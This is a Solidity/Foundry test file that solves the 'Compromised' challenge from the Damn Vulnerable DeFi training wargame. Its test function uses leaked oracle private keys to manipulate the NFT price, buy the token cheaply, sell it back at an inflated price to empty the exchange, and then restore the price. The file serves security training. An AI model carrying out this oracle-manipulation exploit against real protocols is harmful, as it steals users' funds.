// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableNFT.sol";

import "src/Compromised/Exchange.sol";
import "src/Compromised/TrustfulOracle.sol";
import "src/Compromised/TrustfulOracleInitializer.sol";

// Challenge #7 - Compromised
// https://www.damnvulnerabledefi.xyz/challenges/compromised/

contract Attack is Test {
    DamnValuableNFT public nftToken;
    TrustfulOracleInitializer public trustfulOracleInitializerFactory;
    TrustfulOracle public oracle;
    Exchange public exchange;

    address public hacker = 0x4A6f6E8A8433e06cb3ce41BE74Ba4bcb074C6282;
    address[] public sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];
    string[] public symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] public initialPrices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    uint256 public constant EXCHANGE_INITIAL_ETH_BALANCE = 999 * 1e18;
    uint256 public constant INITIAL_NFT_PRICE = 999 * 1e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 1e17;
    uint256 public constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 * 1e18;

    function setUp() public {
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        vm.deal(hacker, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(hacker.balance, PLAYER_INITIAL_ETH_BALANCE);

        trustfulOracleInitializerFactory = new TrustfulOracleInitializer(sources, symbols, initialPrices);
        oracle = trustfulOracleInitializerFactory.oracle();

        exchange = new Exchange{value:EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nftToken = exchange.token();

        assertEq(nftToken.owner(), address(0x0));
        assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
    }

    function testExploit() public {
        // Attack Code:
        address oracle_1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address oracle_2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
        uint256 NEW_PRICE = 1 * 1e16;

        vm.startPrank(oracle_1);
        oracle.postPrice("DVNFT", NEW_PRICE);
        changePrank(oracle_2);
        oracle.postPrice("DVNFT", NEW_PRICE);
        changePrank(hacker);
        exchange.buyOne{value: NEW_PRICE}();
        changePrank(oracle_1);
        oracle.postPrice("DVNFT", NEW_PRICE + INITIAL_NFT_PRICE);
        changePrank(oracle_2);
        oracle.postPrice("DVNFT", NEW_PRICE + INITIAL_NFT_PRICE);
        changePrank(hacker);
        nftToken.approve(address(exchange), 0);
        exchange.sellOne(0);
        changePrank(oracle_1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        changePrank(oracle_2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        assertEq(address(exchange).balance, 0);
        assertGt(hacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(nftToken.balanceOf(hacker), 0);
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
